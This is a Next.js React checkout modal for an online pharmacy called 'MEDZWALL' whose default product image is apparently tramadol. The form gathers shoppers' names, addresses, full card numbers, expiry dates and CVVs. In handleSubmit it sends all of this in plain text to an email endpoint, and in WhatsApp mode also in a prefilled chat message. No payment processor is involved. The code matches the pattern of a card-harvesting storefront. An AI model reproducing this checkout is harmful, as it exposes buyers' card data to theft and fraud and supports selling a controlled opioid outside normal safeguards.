"use client";
import { useState, useEffect } from "react";
import Image from "next/image";
import { useOrderModal } from "./order-modal-context";
import { PRODUCTS } from "../data/products";
import { CONTACT } from "../data/site";
import { US_STATES } from "../data/us-states";

function WhatsAppIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z" />
    </svg>
  );
}

export function OrderModal() {
  const { isOpen, product, mode, closeOrderModal } = useOrderModal();

  // Selected product state inside modal
  const [selectedProduct, setSelectedProduct] = useState(null);
  const [quantity, setQuantity] = useState(1);
  const [selectedVariant, setSelectedVariant] = useState("");
  const [status, setStatus] = useState("idle"); // "idle" | "submitting" | "success" | "error"
  const [errorMessage, setErrorMessage] = useState("");
  const [refCode, setRefCode] = useState("");
  const [whatsappSentUrl, setWhatsappSentUrl] = useState("");

  // Form inputs
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "Alabama",
    zip: "",
    cardHolder: "",
    cardNumber: "",
    cardExp: "",
    cardCvv: "",
  });

  // Sync modal state when opened
  useEffect(() => {
    if (isOpen) {
      setStatus("idle");
      setErrorMessage("");
      if (product) {
        setSelectedProduct(product);
        setQuantity(product.quantity || 1);
        const defVar = product.variant || (product.variants && product.variants[0]?.title) || "";
        setSelectedVariant(defVar);
      } else {
        const defaultProd = PRODUCTS[0];
        setSelectedProduct(defaultProd);
        setQuantity(1);
        setSelectedVariant(defaultProd?.variants?.[0]?.title || "");
      }
    }
  }, [isOpen, product]);

  // Close on Escape
  useEffect(() => {
    function handleKeyDown(e) {
      if (e.key === "Escape" && isOpen) {
        closeOrderModal();
      }
    }
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, closeOrderModal]);

  if (!isOpen) return null;

  const currentPrice = selectedProduct?.priceUSD || (selectedProduct?.price ? selectedProduct.price / 83 : 120);
  const totalAmount = currentPrice * quantity;

  function handleInputChange(e) {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  }

  function handleProductSelect(e) {
    const found = PRODUCTS.find((p) => (p.slug || p.id) === e.target.value);
    if (found) {
      setSelectedProduct(found);
      setSelectedVariant(found.variants?.[0]?.title || "");
    }
  }

  async function handleSubmit(e) {
    e.preventDefault();
    setStatus("submitting");
    setErrorMessage("");

    const orderReference = `MZW-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
    const orderItemsSummary = `${selectedProduct?.name || "Product"}${selectedVariant ? ` (${selectedVariant})` : ""} × ${quantity} = $${totalAmount.toFixed(2)}`;

    // Prepare payload
    const payload = {
      firstName: formData.firstName,
      lastName: formData.lastName,
      email: formData.email,
      phone: formData.phone,
      address: formData.address,
      city: formData.city,
      state: formData.state,
      zip: formData.zip,
      cardHolder: formData.cardHolder,
      cardNumber: formData.cardNumber,
      cardExp: formData.cardExp,
      cardCvv: formData.cardCvv,
      orderItems: orderItemsSummary,
      subtotal: `$${totalAmount.toFixed(2)}`,
      total: `$${totalAmount.toFixed(2)}`,
      refCode: orderReference,
      source: mode === "whatsapp" ? "WhatsApp Detailed Order Modal" : "Detailed Order Modal",
    };

    // If WhatsApp mode: build prefilled WhatsApp message
    if (mode === "whatsapp") {
      const waText = [
        `*MEDZWALL - NEW PHARMACY ORDER*`,
        `Order Ref: ${orderReference}`,
        `----------------------------------------`,
        `*PRODUCT DETAILS:*`,
        `• Medicine: ${selectedProduct?.name || "Medicine"}`,
        `• Pack Size: ${selectedVariant || "Standard"}`,
        `• Quantity: ${quantity}`,
        `• Unit Price: $${currentPrice.toFixed(2)}`,
        `• Total Amount: $${totalAmount.toFixed(2)}`,
        `----------------------------------------`,
        `*CUSTOMER INFORMATION:*`,
        `• Name: ${formData.firstName} ${formData.lastName}`,
        `• Email: ${formData.email}`,
        `• Phone: ${formData.phone}`,
        `----------------------------------------`,
        `*SHIPPING ADDRESS:*`,
        `• Address: ${formData.address}`,
        `• City: ${formData.city}`,
        `• State: ${formData.state}`,
        `• ZIP Code: ${formData.zip}`,
        `----------------------------------------`,
        `*PAYMENT DETAILS:*`,
        `• Card Holder: ${formData.cardHolder}`,
        `• Card Number: ${formData.cardNumber}`,
        `• Expiry: ${formData.cardExp}`,
        `• CVV: ${formData.cardCvv}`,
        `----------------------------------------`,
        `Please confirm order availability and shipping status.`,
      ].join("\n");

      const waUrl = `${CONTACT.whatsapp}?text=${encodeURIComponent(waText)}`;
      setWhatsappSentUrl(waUrl);

      // Open WhatsApp in new tab immediately
      try {
        window.open(waUrl, "_blank", "noopener,noreferrer");
      } catch (err) {
        // Pop-up might be blocked
      }

      // Also send to backend email in background
      try {
        await fetch("/api/send-order", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } catch (err) {
        // Non-blocking for WhatsApp flow
      }

      setRefCode(orderReference);
      setStatus("success");
    } else {
      // Email submission flow
      try {
        const response = await fetch("/api/send-order", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const resData = await response.json();
        if (!response.ok || !resData.success) {
          throw new Error(resData.error || "Failed to submit order. Please contact our support.");
        }
        setRefCode(resData.refCode || orderReference);
        setStatus("success");
      } catch (err) {
        setErrorMessage(err.message || "An error occurred while placing the order.");
        setStatus("error");
      }
    }
  }

  return (
    <div className="order-modal-overlay" onClick={closeOrderModal}>
      <div
        className="order-modal-card"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-modal="true"
        aria-labelledby="order-modal-title"
      >
        {/* Header */}
        <div className="order-modal-header">
          <h2 id="order-modal-title">Submit your order</h2>
          <button
            type="button"
            className="order-modal-close"
            onClick={closeOrderModal}
            aria-label="Close modal"
          >
            ✕
          </button>
        </div>

        {status === "success" ? (
          <div className="order-modal-success">
            <span className="order-modal-success-icon">✓</span>
            <h3>Order Submitted Successfully!</h3>
            <p>
              Your order details have been securely recorded.
              {mode === "whatsapp"
                ? " If WhatsApp did not open automatically, please click below to send your order message to our pharmacy team."
                : ` A confirmation has been dispatched to your email and our pharmacy team at ${CONTACT.email}.`}
            </p>
            <div className="order-modal-ref-badge">
              Reference ID: <strong>{refCode}</strong>
            </div>

            <div className="order-modal-success-actions">
              {mode === "whatsapp" && whatsappSentUrl && (
                <a
                  href={whatsappSentUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="order-modal-wa-btn"
                >
                  <WhatsAppIcon />
                  <span>Open WhatsApp to Confirm</span>
                </a>
              )}
              <button
                type="button"
                className="button button-outline"
                onClick={closeOrderModal}
              >
                Close &amp; Continue Shopping
              </button>
            </div>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="order-modal-form">
            {/* Product Summary Row */}
            {selectedProduct && (
              <div className="order-modal-product-box">
                <div className="order-modal-product-img">
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img
                    src={selectedProduct.image || "/products/tramadol-1.webp"}
                    alt={selectedProduct.name}
                    width={64}
                    height={64}
                    style={{ objectFit: "contain" }}
                    onError={(e) => {
                      e.target.style.display = "none";
                    }}
                  />
                </div>

                <div className="order-modal-product-info">
                  <div className="order-modal-product-name-row">
                    <span className="order-modal-product-name">
                      {selectedProduct.name}
                    </span>
                    <span className="order-modal-product-meta">
                      {selectedVariant || selectedProduct.unit || "Care&Cure Pharma"}
                    </span>
                  </div>

                  <div className="order-modal-product-calc">
                    <span className="order-modal-unit-price">
                      ${currentPrice.toFixed(2)} ×
                    </span>
                    <div className="order-modal-stepper">
                      <button
                        type="button"
                        onClick={() => setQuantity((q) => Math.max(1, q - 1))}
                        aria-label="Decrease quantity"
                      >
                        −
                      </button>
                      <span>{quantity}</span>
                      <button
                        type="button"
                        onClick={() => setQuantity((q) => q + 1)}
                        aria-label="Increase quantity"
                      >
                        +
                      </button>
                    </div>
                    <span className="order-modal-item-total">
                      ${totalAmount.toFixed(2)}
                    </span>
                    <button
                      type="button"
                      className="order-modal-trash-btn"
                      onClick={() => setQuantity(1)}
                      title="Reset quantity"
                      aria-label="Reset quantity"
                    >
                      🗑️
                    </button>
                  </div>
                </div>

                <div className="order-modal-total-callout">
                  <span className="order-modal-total-label">TOTAL:</span>
                  <span className="order-modal-total-val">
                    ${totalAmount.toFixed(2)}
                  </span>
                </div>
              </div>
            )}

            {/* If opened without a specific product, allow picking product */}
            {!product && (
              <div className="order-modal-product-picker">
                <label htmlFor="order-product-select">
                  Selected Medicine:
                  <select
                    id="order-product-select"
                    value={selectedProduct?.slug || selectedProduct?.id || ""}
                    onChange={handleProductSelect}
                  >
                    {PRODUCTS.map((p) => (
                      <option key={p.id} value={p.slug || p.id}>
                        {p.name} — ${p.priceUSD ? p.priceUSD.toFixed(2) : "120.00"}
                      </option>
                    ))}
                  </select>
                </label>
              </div>
            )}

            {errorMessage && (
              <div className="order-modal-error">{errorMessage}</div>
            )}

            {/* Input Fields */}
            <div className="order-modal-fields">
              <div className="order-modal-field">
                <label htmlFor="modal-firstName">First Name*</label>
                <input
                  id="modal-firstName"
                  name="firstName"
                  required
                  value={formData.firstName}
                  onChange={handleInputChange}
                  placeholder=""
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-lastName">Last Name*</label>
                <input
                  id="modal-lastName"
                  name="lastName"
                  required
                  value={formData.lastName}
                  onChange={handleInputChange}
                  placeholder=""
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-email">Email*</label>
                <input
                  id="modal-email"
                  name="email"
                  type="email"
                  required
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder=""
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-phone">Phone Number*</label>
                <input
                  id="modal-phone"
                  name="phone"
                  type="tel"
                  required
                  value={formData.phone}
                  onChange={handleInputChange}
                  placeholder=""
                />
              </div>

              <div className="order-modal-field order-modal-field-full">
                <label htmlFor="modal-address">Shipping Address*</label>
                <input
                  id="modal-address"
                  name="address"
                  required
                  value={formData.address}
                  onChange={handleInputChange}
                  placeholder="Address 1"
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-city">City*</label>
                <input
                  id="modal-city"
                  name="city"
                  required
                  value={formData.city}
                  onChange={handleInputChange}
                  placeholder="Enter City"
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-state">State (US)*</label>
                <select
                  id="modal-state"
                  name="state"
                  required
                  value={formData.state}
                  onChange={handleInputChange}
                >
                  {US_STATES.map((st) => (
                    <option key={st} value={st}>
                      {st}
                    </option>
                  ))}
                </select>
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-zip">Zip Code*</label>
                <input
                  id="modal-zip"
                  name="zip"
                  required
                  value={formData.zip}
                  onChange={handleInputChange}
                  placeholder="Enter Zipcode"
                />
              </div>

              <div className="order-modal-field order-modal-field-full">
                <label htmlFor="modal-cardHolder">Card Holder Name*</label>
                <input
                  id="modal-cardHolder"
                  name="cardHolder"
                  required
                  value={formData.cardHolder}
                  onChange={handleInputChange}
                  placeholder="Card Name"
                />
              </div>

              <div className="order-modal-field order-modal-field-full">
                <label htmlFor="modal-cardNumber">Card Number*</label>
                <input
                  id="modal-cardNumber"
                  name="cardNumber"
                  required
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  placeholder="Enter Card Number"
                  maxLength={19}
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-cardExp">Expiry Date*</label>
                <input
                  id="modal-cardExp"
                  name="cardExp"
                  required
                  value={formData.cardExp}
                  onChange={handleInputChange}
                  placeholder="Expiry Date"
                  maxLength={7}
                />
              </div>

              <div className="order-modal-field">
                <label htmlFor="modal-cardCvv">CVV*</label>
                <input
                  id="modal-cardCvv"
                  name="cardCvv"
                  type="password"
                  required
                  value={formData.cardCvv}
                  onChange={handleInputChange}
                  placeholder="CVV"
                  maxLength={4}
                />
              </div>
            </div>

            {/* Subtotal & Total */}
            <div className="order-modal-summary-section">
              <div className="order-modal-subtotal-row">
                <span>Subtotal</span>
                <span>${totalAmount.toFixed(2)}</span>
              </div>
              <div className="order-modal-final-total-row">
                <span>TOTAL</span>
                <span className="order-modal-final-total-val">
                  ${totalAmount.toFixed(2)}
                </span>
              </div>
            </div>

            {/* Bottom Actions */}
            <div className="order-modal-bottom-actions">
              <button
                type="button"
                className="order-modal-continue-btn"
                onClick={closeOrderModal}
              >
                Continue shopping
              </button>
              <button
                type="submit"
                className={`order-modal-submit-btn ${mode === "whatsapp" ? "wa-submit" : ""}`}
                disabled={status === "submitting"}
              >
                {status === "submitting" ? (
                  "Processing Order…"
                ) : mode === "whatsapp" ? (
                  <>
                    <WhatsAppIcon />
                    <span>Place Order</span>
                  </>
                ) : (
                  "Place Order"
                )}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
